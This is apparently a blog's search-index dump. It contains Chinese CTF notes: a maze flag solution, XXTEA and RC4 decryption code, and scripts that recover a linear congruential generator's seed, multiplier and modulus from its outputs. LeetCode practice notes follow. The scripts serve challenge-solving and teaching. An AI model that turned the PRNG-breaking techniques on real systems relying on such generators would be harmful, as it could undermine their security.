长度为64,推测是8*8 123maze = &quot; ******* * **** * **** * *** *# *** *** *** *********&quot;for i in range(8): print(maze[i*8:(i+1)*8]) 猜测O为右，o为左，.为上，0为下 1234567891011121314string = &quot;右下右右下下左下下下右右右右上上左左&quot;direction = &quot;&quot;for i in string: if i == &quot;右&quot;: direction += &quot;O&quot; elif i == &quot;左&quot;: direction += &quot;o&quot; elif i == &quot;下&quot;: direction += &quot;0&quot; elif i == &quot;上&quot;: direction += &quot;.&quot;flag = &quot;nctf{&quot;+direction+&quot;}&quot;print(len(flag))print(flag) nctf{O0OO00o000OOOO..oo}","link":"/2022/03/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re/"},{"title":"test for my first blog","text":"It’s the first time to test my blog , thanks to z1r0 !!!","link":"/2022/01/22/test/readme/"},{"title":"CTF常见加密算法","text":"汇总CTF常见加密算法的解密脚本 XXtea具体可以查看这篇博客 C实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;stdio.h&gt; using namespace std; #include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) { /* Coding Part */ rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) { /* Decoding Part */ n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; } while ((sum -= DELTA) != 0); } } int main(){ uint32_t const key[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210}; uint32_t data[3]={0x12345678,0x87654321,0x13579243}; uint32_t *sent=data; btea(sent,3,key); printf(&quot;coded:%x %x %x \\n&quot;,sent[0],sent[1],sent[2]); btea(sent,-3,key); printf(&quot;decoded:%x %x %x \\n&quot;,sent[0],sent[1],sent[2]); return 0;} 例题1：eztea解这种题目的时候要注意轮回次数以及递增变量大小 解密脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;stdio.h&gt; using namespace std; #include &lt;stdint.h&gt;#define DELTA 0x61C88647#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned int p, rounds, e; if (n &gt; 1) { /* Coding Part */ rounds = 172; sum = 0; z = v[n-1]; do { sum = (sum - DELTA) &amp; 0xFFFFFFFF; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) { /* Decoding Part */ n = -n; rounds = 172; sum = (rounds*-DELTA) &amp; 0xFFFFFFFF; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; } while ((sum = (sum+DELTA)&amp;0xFFFFFFFF) != 0); } } int main(){ uint32_t const key[4]={4660,22136,37155,17767}; uint32_t data[4]={1332370953,2931878637,776785408,4020115239}; uint32_t *sent=data; printf(&quot;before:%x %x %x %x\\n&quot;,sent[0],sent[1],sent[2],sent[3]); btea(sent,-4,key); printf(&quot;decoded:%x %x %x %x\\n&quot;,sent[0],sent[1],sent[2],sent[3]); btea(sent,4,key); printf(&quot;encoded:%x %x %x %x\\n&quot;,sent[0],sent[1],sent[2],sent[3]); return 0;} 例题2 2022-DefCampCTF-cup_of_teaRC4原理请查看这里 例题1 GUET-CTF2019-encrypt例题2 2021CISCN-glass下面给出c实现RC4加密解密代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void rc4_init(unsigned char*s,unsigned char*key,unsigned long len){ int i=0; int j=0; unsigned char k[256]={}; unsigned char temp = 0; for(i=0;i&lt;256;i++) { s[i]=i; //0-255赋给s k[i]=key[i%len]; //将k重新计算 } for(i=0;i&lt;256;i++) { j=(j+s[i]+k[i])%256; //给j赋值 temp=s[i]; s[i]=s[j]; s[j]=temp; //s[i]和s[j]交换 }}void rc4_crypt(unsigned char*s,unsigned char*data,unsigned long len){ int i=0,j=0,t=0; unsigned long k=0; unsigned char temp; for(k=0;k&lt;len;k++) { i=(i+1)%256; //固定方式生成的i j=(j+s[i])%256; //固定方式生成的j temp=s[i]; s[i]=s[j]; s[j]=temp; //交换s[i]和s[j] t=(s[i]+s[j])%256; //固定方式生成的t data[k]^=s[t]; //来作为s的下标和data进行异或运算 }}int main(){ unsigned char s[256]={0}; int i=0,j=0; char key[256] = &quot;12345678&quot;; unsigned char data[512]={0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02,0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F,0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F, 0x00}; unsigned long data_len = 39; unsigned long key_len = 8; for(i=0;i&lt;39;i+=key_len) { for (j = 0; (key_len &amp; ~(key_len &gt;&gt; 31)) != j &amp;&amp; i + j &lt; 39; ++j) { data[i+j] = data[i+j] ^ key[j]; } } for(i=0;i&lt;data_len;i+=3) { //向右循环回去 data[i+1] = data[i] ^ data[i+1]; data[i+2] = data[i+1] ^ data[i+2]; data[i] = data[i+2] ^ data[i]; } rc4_init(s,(unsigned char*)key,key_len);//初始化得到s rc4_crypt(s,(unsigned char*)data,data_len);//解密 for(i=0;i&lt;39;i++) { printf(&quot;%c&quot;,data[i]); } return 0;} LCG(线性同余生成器)我们设置增量为b，乘数为a，模数为n，seed随机产生，Si为产生的随机数项数 s0 = (a * seed + b) % n s1 = (a * s0 + b) % n …… 原理实现可以查看这篇博客 ezLCGseed是随机产生的，需要输入四个正确的seed值。四个challenge对应四个不同的类型，正好可以用这题来学习一下，解密代码来自Facker007师傅。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import osimport hashlibfrom string import ascii_lettersfrom Crypto.Util.number import *from Crypto.Random.random import randrange, getrandbits, choicefrom flag import flagclass LCG(object): def __init__(self, seed): # 产生一个256位二进制素数 self.N = getPrime(256) # 在N范围内随机产生两个数 self.a = randrange(self.N) self.b = randrange(self.N) # seed = seed%N self.seed = seed % self.N self.state = self.seed # self.state = (a * seed + b)% N def next(self): self.state = (self.a * self.state + self.b) % self.N return self.statedef challenge1(): print(&quot;This is the challenge1&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.a=&quot;+str(lcg.a)) print(&quot;lcg.b=&quot;+str(lcg.b)) print(&quot;lcg.N=&quot;+str(lcg.N)) print(&quot;lcg.num1=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;)def challenge2(): print(&quot;This is the challenge2&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.a=&quot;+str(lcg.a)) print(&quot;lcg.N=&quot;+str(lcg.N)) print(&quot;lcg.num1=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;)def challenge3(): print(&quot;This is the challenge3&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.N=&quot;+str(lcg.N)) print(&quot;lcg.num1=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num3=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;)def challenge4(): print(&quot;This is the challenge4&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.num1=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;)challenge1()challenge2()challenge3()challenge4()print(&quot;OHHH,give you flag:&quot;+str(flag)) 1、乘数、增量、模数以及第一项已知当我们知道乘数a，增量b模数n，以及第一项s0的值： 123456789101112131415161718192021222324252627282930313233343536373839import osimport hashlibfrom string import ascii_lettersfrom Crypto.Util.number import *from Crypto.Random.random import randrange, getrandbits, choicefrom flag import flagclass LCG(object): def __init__(self, seed): # 产生一个256位二进制素数 self.N = getPrime(256) # 在N范围内随机产生两个数 self.a = randrange(self.N) self.b = randrange(self.N) # seed = seed%N self.seed = seed % self.N self.state = self.seed # self.state = (a * seed + b)% N def next(self): self.state = (self.a * self.state + self.b) % self.N return self.statedef challenge1(): print(&quot;This is the challenge1&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.a=&quot;+str(lcg.a)) print(&quot;lcg.b=&quot;+str(lcg.b)) print(&quot;lcg.N=&quot;+str(lcg.N)) print(&quot;lcg.num1=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;) challenge1() 解密代码： 1234567891011from Crypto.Util.number import *a=11117737577616430261700579904669567704125468079996490555771745492505915194718b=84923302761234043356542012549810957105354826174004592024027163821299864963373n=92990280170239686940570202979208858357118851384588771765813565538598979636449c=75995933492081158742111827152893916938467931731213291787903627350954936992901MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算ani=MMI(a,n) seed=cseed = (ani*(seed-b))%nprint(seed) 2、增量未知增量b未知，但是我们指导乘数a，模数n，以及第一项s0和第二项s1的值 12345678910111213def challenge2(): print(&quot;This is the challenge2&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.a=&quot;+str(lcg.a)) print(&quot;lcg.N=&quot;+str(lcg.N)) print(&quot;lcg.num1=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;) 12s1 = s0 * a + b (mod n)b = s1 - s0 * a (mod n) 所以先把b求出，在将b带入第一种情况的公式中计算 12345678910111213a=60323727461893512389613444053173573556289769830864516385213165273963439419666n=63772765535116504991324866664138155127506417671814317141463381824201626745971output1=43256779548950618105205057172060658758096778650647953356786682933134845983013output2=29587660751402347472955722163351167446529078992073715521709478134706039994408b=(output2-a*output1)%nplaintext=bprint(b)MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算ani=MMI(a,n) seed=output1seed = (ani*(seed-b))%nprint(seed) 3、增量和乘数都未知不知道增量、乘数，但是我们知道模数和生成的三个项 12345678910111213def challenge3(): print(&quot;This is the challenge3&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.N=&quot;+str(lcg.N)) print(&quot;lcg.num1=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num3=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;) 通过推导，我们能够得出m和第一项s0和s1的关系，进而求出乘数a 123456789s_1 = s0 * a + c (mod n)s_2 = s1 * a + c (mod n) s_2 - s_1 = s1 * a - s0 * a (mod n) s_2 - s_1 = a * (s1 - s0) (mod n) a = (s_2 - s_1) / (s_1 - s_0) (mod n) 解密代码： 123456789n=104461692199190870384162670916383905806504699111028506483787017106937648022643output=[6550230559976097543274928060228453869006546100488341839360547865795937436891,44752667588957927743657454733563259587297714640962541054244442038265293238724,89196637577760609199681073855370265788123333887828297191613180231566862499303]MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算a=(output[2]-output[1])*MMI((output[1]-output[0]),n)%nani=MMI(a,n)b=(output[1]-a*output[0])%nseed = (ani*(output[0]-b))%nprint(seed) 4.增量，乘数和模数均未知123456789101112131415def challenge4(): print(&quot;This is the challenge4&quot;) init_seed = getrandbits(256) lcg = LCG(init_seed) print(&quot;lcg.num1=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) print(&quot;lcg.num2=&quot;+str(lcg.next())) seed1 = int(input(&quot;lcg.seed = &quot;)) if seed1 != lcg.seed: print(&quot;worry&quot;) exit(0) print(&quot;success!&quot;) 通过以上的条件，我们可以得知 123456s1 = s0*a + b (mod n)s2 = s1*a + b (mod n)s3 = s2*a + b (mod n)s1 - (s0*a + b) = k_1 * ns2 - (s1*a + b) = k_2 * ns3 - (s2*a + b) = k_3 * n 123456t0 = s1 - s0 t1 = s2 - s1 = (s1*a + b) - (s0*a + b) = a*(s1 - s0) = a*t0 (mod n) t2 = s3 - s2 = (s2*a + b) - (s1*a + b) = a*(s2 - s1) = a*t1 (mod n) t3 = s4 - s3 = (s3*a + b) - (s2*a + b) = a*(s3 - s2) = a*t2 (mod n)t2*t0 - t1*t1 = (a*a*t0 * t0) - (a*t0 * a*t0) = 0 (mod n) 这样我们就能得知模数的值了，然后和上面的步骤一样，首先是求出乘数a，再求出增量b，最后求出seed 1234567891011121314151617181920212223242526from Crypto.Util.number import *def gcd(a,b): if(b==0): return a else: return gcd(b,a%b) s=[57910593547760246431462713630032142367244471051605076587740229220042280832920,11600425056943962908662902750683336131127946274679975994830394345407157891082,47119365134041787030301982910979871560470568882978296406276875902026809579279,25490059061411916076337727920693205583062663924577215773084273265684255685447,47700923797846895333737702397666052553146427650812068867781925243881523549580,16494559622316759559052404259689488233512192201762700665909062412108972353608]t = []for i in range(5): t.append(s[i]-s[i-1]) all_n = []for i in range(3): all_n.append(gcd((t[i+1]*t[i-1]-t[i]*t[i]), (t[i+2]*t[i]-t[i+1]*t[i+1]))) MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算for n in all_n: n=abs(n) if n==1: continue a=(s[2]-s[1])*MMI((s[1]-s[0]),n)%n ani=MMI(a,n) b=(s[1]-a*s[0])%n seed = (ani*(s[0]-b))%n print(&quot;seed=&quot;,seed) plaintext=seed print(long_to_bytes(plaintext)) RSA当然也有RSA，详细查看我的另一篇博客 ECC记录一下XCTF中的一道关于ECC的题目 123456789101112131415已知椭圆曲线加密Ep(a,b)参数为p = 15424654874903a = 16546484b = 4548674875G(6478678675,5636379357093)私钥为k = 546768求公钥K(x,y) 这边使用ECCTOOL来解 Rx = 13957031351290 Ry = 5520194834100 Rx + Ry = 19477226185390","link":"/2022/04/27/%E7%AE%97%E6%B3%95/CTF%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93-%E6%9B%B4%E6%96%B0/"},{"title":"leetcode_每日练习","text":"记录LeetCode的一些练习… 728.自除数 12345678910111213141516class Solution: def selfDividingNumbers(self, left: int, right: int) -&gt; List[int]: arr = [] for i in range(left,right+1): flag = True lis = list(str(i)) if '0' in lis: continue for j in lis: if i % int(j) != 0: flag = False break if flag == True: arr.append(i) return arr 注意除数为0的可能，范围为1-10000 评论区再次秀到了我，面向用例编程 3.无重复字符的最长子串 拉垮了，自己写了个算法，check不过呢 1234567891011121314151617181920212223class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: counts = [0]*len(s) for i in range(len(s)): count = 0 a = [] for j in range(i,len(s)): if s[j] in a: break else: a.append(s[j]) count += 1 counts[count] = count # strings.append(&quot;&quot;.join(a)) ans = max(counts) return int(counts[ans]) 正解：官方wp链接：https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/solution/wu-zhong-fu-zi-fu-de-zui-chang-zi-chuan-by-leetc-2/ 这一题方法是方法是”滑动窗口” 123456789101112131415161718class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: # 哈希集合，记录每个字符是否出现过 occ = set() n = len(s) # 右指针，初始值为 -1，相当于我们在字符串的左边界的左侧，还没有开始移动 rk, ans = -1, 0 for i in range(n): if i != 0: # 左指针向右移动一格，移除一个字符 occ.remove(s[i - 1]) while rk + 1 &lt; n and s[rk + 1] not in occ: # 不断地移动右指针 occ.add(s[rk + 1]) rk += 1 # 第 i 到 rk 个字符是一个极长的无重复字符子串 ans = max(ans, rk - i + 1) return ans 用到了python内置函数，set（） 94.二叉树中序遍历 自己写的根本通不过，虽然意思懂了……就不展示了 下面是参考其中一个题解的递归算法: 正解：123456789101112131415161718# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def inorderTraversal(self, root): res = [] self.inOrder(root,res) return res def inOrder(self,root,res): if root == None: return self.inOrder(root.left,res) res.append(root.val) self.inOrder(root.right,res) 后面附上陈斌老师关于python数据结构的二叉树的链表实现，及其前序中序后序的递归实现: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class BinaryTree: def __init__(self,rootObj): self.key = rootObj self.leftChild = None self.rightChild = None def insertLeft(self,newNode): if self.leftChild == None: self.leftChild = BinaryTree(newNode) else: t = BinaryTree(newNode) t.leftChild = self.leftChild self.leftChild = t def insertRight(self,newNode): if self.rightChild == None: self.rightChild = BinaryTree(newNode) else: t = BinaryTree(newNode) t.rightChild = self.rightChild self.rightChild = t def getRightChild(self): return self.rightChild def getLeftChild(self): return self.leftChild def setRootVal(self,obj): self.key = obj def getRootVal(self): return self.key def preOrderTraverse(tree): if tree != None: print(tree.getRootVal()) preOrderTraverse(tree.getLeftChild()) preOrderTraverse(tree.getRightChild())def postOrderTraverse(tree): if tree != None: postOrderTraverse(tree.getLeftChild()) print(tree.getRootVal()) postOrderTraverse(tree.getRightChild())def inOrderTraverse(tree): if tree != None: inOrderTraverse(tree.getLeftChild()) print(tree.getRootVal()) inOrderTraverse(tree.getRightChild()) # 构造二叉树r = BinaryTree('0')r.insertLeft('7')r.insertLeft('3')r.insertLeft('1')r.insertRight('6')r.insertRight('2')r.getLeftChild().getLeftChild().insertRight('8')r.getLeftChild().insertRight('4')r.getLeftChild().getRightChild().insertLeft('9')r.getRightChild().insertLeft('5')print(&quot;---preorder---&quot;)preOrderTraverse(r)print(&quot;---inorder---&quot;)inOrderTraverse(r)print(&quot;---postorder---&quot;)postOrderTraverse(r) 把以前逆向关于二叉树遍历的题目拿出来，带入验证一下 100.相同的树这题还是用的深度优先算法 如果两个节点都没有，那么肯定相同 如果两个节点只有一个有，那么肯定不同 比较完节点之后，开始比较节点的值，如果两个节点的值不相同，则两颗树是不同的。 后面就是bfs深度优先算法 123456789class Solution: def isSameTree(self, p: TreeNode, q: TreeNode) -&gt; bool: if not p and not q: return True elif not p or not q: return False elif p.val != q.val: return False return self.isSameTree(p.left,q.left) and self.isSameTree(p.right,q.right) 这篇博客讲写树算法套路框架的： https://leetcode-cn.com/problems/same-tree/solution/xie-shu-suan-fa-de-tao-lu-kuang-jia-by-wei-lai-bu-/ 112.路径总和 123456789101112131415# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def hasPathSum(self, root: Optional[TreeNode], sum: int) -&gt; bool: if not root: return False if root.val == sum and not root.right and not root.left: return True left = self.hasPathSum (root.left,sum - root.val) right = self.hasPathSum (root.right,sum - root.val) return left or right 这边还是递归，有两个限制 如果root为空，而且sum值还存在，则返回False 如果sum值正好等于当前节点的val值，且为根节点，则返回True 下面就是两个递归算法，返回值为left or right，满足一个条件为Ture即可。 113.路径总和（二） 123456789101112131415161718192021222324252627# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def pathSum(self, root: Optional[TreeNode], sum: int) -&gt; List[List[int]]: lis = [] path = [] def dfs(root,sum): if not root: return path.append(root.val) sum -= root.val if not root.right and not root.left and sum == 0 : lis.append(path[:]) dfs(root.right,sum) dfs(root.left,sum) path.pop() dfs(root,sum) return lis 就是在上面的基础上，增加了append的功能 在dfs()算法的最后，需要加上pop()语句，用来回溯正确的值。 5.最长回文子串12345678910111213class Solution: def longestPalindrome(self,s: str) -&gt; str: length = len(s) max_length = 0 max_string = '' for i in range(length+1): for j in range(i,length+1): if s[i:j] == s[i:j][::-1]: if len(s[i:j]) &gt; max_length: max_length = len(s[i:j]) max_string = s[i:j] return max_string 自己编写的，可惜超时了，去评论区找找更好的解决方案： 对于暴力算法的改进……在第二重循环中优先判断长度，但还是超时 123456789101112131415class Solution: def longestPalindrome(self,s: str) -&gt; str: length = len(s) max_length = 0 max_string = '' for i in range(length+1): for j in range(i,length+1): if len(s[i:j]) &lt; max_length: continue if s[i:j] == s[i:j][::-1]: if len(s[i:j]) &gt; max_length: max_length = len(s[i:j]) max_string = s[i:j] return max_string 这边推荐使用中心扩散算法，循环字符串中的每一位个字符，并向字符两边扩散，如果两边字符都相当且不越界，则正确，返回left和right截取的字符串。 当然，也要考虑最长回文子串为偶数的情况，第二个if就是为其考虑的。 官方解题： 1234567891011121314151617class Solution: def expandAroundCenter(self, s, left, right): while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]: left -= 1 right += 1 return left + 1, right - 1 def longestPalindrome(self, s: str) -&gt; str: start, end = 0, 0 for i in range(len(s)): left1, right1 = self.expandAroundCenter(s, i, i) left2, right2 = self.expandAroundCenter(s, i, i + 1) if right1 - left1 &gt; end - start: start, end = left1, right1 if right2 - left2 &gt; end - start: start, end = left2, right2 return s[start: end + 1] 来源： https://leetcode-cn.com/problems/longest-palindromic-substring/solution/zui-chang-hui-wen-zi-chuan-by-leetcode-solution/ 剑指 Offer 44. 数字序列中某一位的数字 自己代入的1009算的，但还是错了 123456789101112131415161718192021222324252627282930313233343536373839# 0-9 9 1位# 10-99 90 2位# 100-999 900 3位# 1000-9999 9000 4位class Solution: def findNthDigit(self, n: int) -&gt; int: length = len(str(n)) if length == 1: return n else: lis = [] for i in range(length): lis.append(9*(10**i)) j = 0 #当前区段之前总的多少个数字位 q = 1 #区段数 while j &lt; n and j + (lis[i-1] * q) &lt; n: j = j + (lis[i-1] * q) q += 1 # 之前的位数 sum_w = 0 for i in range(q): sum_w += (i+1)*lis[i] # 当前段中的第几位 # q+1：当前段的字符长度 current = (n-sum_w)/(q+1) sum_n = 0 # 总的多少个数字 for i in range(q): sum_n += lis[i] sum_n += int(current) # 当前数字的位数 number = int((current-int(current))*(q+1)) return int(str(sum_n)[number]) 正解：12345678910class Solution: def findNthDigit(self, n: int) -&gt; int: digit, start, count = 1, 1, 9 while n &gt; count: # 1. n -= count start *= 10 digit += 1 count = 9 * start * digit num = start + (n - 1) // digit # 2. return int(str(num)[(n - 1) % digit]) # 3. 还是大佬厉害啊，俺的做法跟他差不多，就是不知道哪里错了…… 275.H 指数 II 1234567891011class Solution: def hIndex(self, citations: List[int]) -&gt; int: length = len(citations) if max(citations) == 0: return 0 elif (length == 1 and citations[0] != 0) or (length &gt; 1 and max(citations[:length-1]) == 0): return 1 else: for i in range(length-1): if citations[i] == (length - i) or citations[i] == (length - i -1): return citations[i] 会有各种稀奇古怪的组合，得面面俱到，就和修洞一样(doge) 我就是简单的测试了以下当前的值与列表后面值得个数，以及考虑到了一些特殊情况，这边的话，就不修了…… 正解这题最好使用的方法是二分查找： 123456789101112class Solution: def hIndex(self, citations: List[int]) -&gt; int: n = len(citations) left = 0 right = n - 1 while left &lt;= right: mid = left + (right - left) // 2 if citations[mid] &gt;= n - mid: right = mid - 1 else: left = mid + 1 return n - left 当然看题解区也有遍历数组的解法，我和他的想法类似，就是我拉大跨罢了： 12345678910111213class Solution: def hIndex(self, citations: List[int]) -&gt; int: citations.reverse() flag=True n=len(citations) for i in range(1,n+1): if citations[i-1]&lt;i: flag=False break if not flag: return i-1 else: return n 来源：https://leetcode-cn.com/problems/h-index-ii/solution/yi-ci-bian-li-ji-ke-by-qian-li-ma-8-liyt/ 1089.复写零 和paixiaoxing讨论了这题，for循环不好控制，就用的是while循环。每次遇到0，都会把k再往后加一，并且pop最后一个列表元素，保证列表的长度不变。 1234567891011121314class Solution: def duplicateZeros(self, List: List[int]) -&gt; None: &quot;&quot;&quot; Do not return anything, modify List in-place instead. &quot;&quot;&quot; length = len(List) k = 0 while k &lt; length: if List[k] == 0: List.insert(k+1, 0) List.pop() k += 1 k += 1 1309.解码字母到整数映射 从后往前，遇到#，就把前面两个字符转换成整形，再转换成str型；如果没有遇到#，就正常ascii+48的转换。 第一次提交就全部通过，并且成绩还不赖！！ 12345678910111213class Solution: def freqAlphabets(self, s: str) -&gt; str: flag = '' i = len(s) - 1 while i &gt;= 0: if ord(s[i]) == 35: n = int(s[i-2:i]) flag += chr(n+96) i -= 2 else: flag += chr(ord(s[i]) + 48) i -= 1 return flag[::-1] 451.根据字符出现频率排序 自己编写，把所有可能出现的字符加入到字典中，然后循环字典统计字符出现次数，按照字典value排序，然后构建返回的flag，就是最后的思路，最后的循环可以再优化一下， 123456789101112131415161718class Solution: def frequencySort(self, string: str) -&gt; str: dic = {'a':0,'b':0,'c':0,'d':0,'e':0,'f':0,'g':0,'h':0,'i':0,'j':0,'k':0,'l':0,'m':0,'n':0,'o':0,'p':0,'q':0,'r':0,'s':0,'t':0,'u':0,'v':0,'w':0,'x':0,'y':0,'z':0,'A':0,'B':0,'C':0,'D':0,'E':0,'F':0,'G':0,'H':0,'I':0,'J':0,'K':0,'L':0,'M':0,'N':0,'O':0,'P':0,'Q':0,'R':0,'S':0,'T':0,'U':0,'V':0,'W':0,'X':0,'Y':0,'Z':0,'1':0,'2':0,'3':0,'4':0,'5':0,'6':0,'7':0,'8':0,'9':0,'0':0} # 遍历字符串统计次数 for i in range(len(string)): dic[string[i]] += 1 # 按字典的value进行排序 dic2 = sorted(dic.items(), key = lambda kv:(kv[1], kv[0]), reverse = True) flag = '' for item in dic2: flag += item[1]*item[0] return flag 我惊了，人家可以用一行代码…… 原来Counter可以直接统计列表或者字符中元素出现的次数 1234from collections import Counterclass Solution: def frequencySort(self, s: str) -&gt; str: return &quot;&quot;.join([ch * cn for (ch, cn) in collections.Counter(s).most_common()]) 109. 有序链表转换二叉搜索树在这边学习一下：快慢指针+链表分裂构造二叉树 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode() {} * ListNode(int val) { this.val = val; } * ListNode(int val, ListNode next) { this.val = val; this.next = next; } * } *//** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode() {} * TreeNode(int val) { this.val = val; } * TreeNode(int val, TreeNode left, TreeNode right) { * this.val = val; * this.left = left; * this.right = right; * } * } */class Solution { public TreeNode sortedListToBST(ListNode head) { if(head == null){ return null; }else if(head.next == null){ return new TreeNode(head.val); } //设置快慢节点 ListNode fast = head; ListNode slow = head; // pre是最中间节点的前驱结点 ListNode pre = slow; while(fast != null &amp;&amp; fast.next != null){ fast = fast.next.next; pre = slow; slow = slow.next; } //利用中间节点创建二叉树根节点 TreeNode root = new TreeNode(slow.val); //创建右链表 root.right = sortedListToBST(slow.next); // 断开链表，slow这个节点已经用过了，前后都需要断开 slow.next = null; pre.next = null; //创建左链表 root.left = sortedListToBST(head); return root; }} 快慢链表节点用来确定链表中的中间节点，pre是确定中间节点的前一个节点，扫描出中间节点来作为二叉树根节点，然后是创建左右链表，并断开左右链表的链接，把左右链表的头节点放到递归函数中。 1207. 独一无二的出现次数根据前天的Counter写出的算法，用set()去重，对比长度即知是否重复 123456789from collections import Counterclass Solution: def uniqueOccurrences(self, arr: List[int]) -&gt; bool: times = [] for item in Counter(arr).most_common(): times.append(item[1]) return len(set(times)) == len(times) 有点拉 在评论区学到一招： 1Counter(arr).values() 改进：1234from collections import Counterclass Solution: def uniqueOccurrences(self, arr: List[int]) -&gt; bool: return len(set(Counter(arr).values())) == len(Counter(arr).values()) 8.字符串转换整数 (atoi) 